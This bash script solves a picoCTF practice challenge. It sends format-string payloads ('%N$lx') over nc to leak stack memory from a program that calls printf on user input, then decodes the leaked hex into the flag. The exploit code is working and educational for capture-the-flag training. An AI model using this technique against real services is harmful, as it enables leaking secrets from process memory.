#!/bin/bash

# https://play.picoctf.org/practice/challenge/434
#
# The source code is directly calling printf(buf) without format string, so we
# can supply the format strings ourselves to snoop around the stack hoping that
# the flag in `flag[64]` is somewhere near

# shellcheck disable=SC1090
source ~/bin/utility/main.sh
checkdeps nc grep echo cut xxd rev

SERVER=""
PORT=""
FIELD=15

FOUND_FLAG=1
for i in {1..25}; do
  output=$(nc "$SERVER" "$PORT" <<< "%$i\$lx" | tr '\n' ' ')
  hex=$(cut -d' ' -f"$FIELD" <<<  "$output")
  str=$(xxd -r -p 2>/dev/null <<< "$hex" | tr -d '\n\0')
  rev=$(rev 2>/dev/null <<< "$str" )
  if grep -q 'pico' <<< "$rev" ; then
    FOUND_FLAG=0
  fi
  echo "$i: hex=[ 0x$hex ], str=[ $str ], rev=[ $rev ]"
  FLAG+=${FOUND_FLAG:+"$rev"}
done

# https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html
FLAG="pico${FLAG#*pico}"
FLAG="${FLAG%\}*}}"
echo "$FLAG"
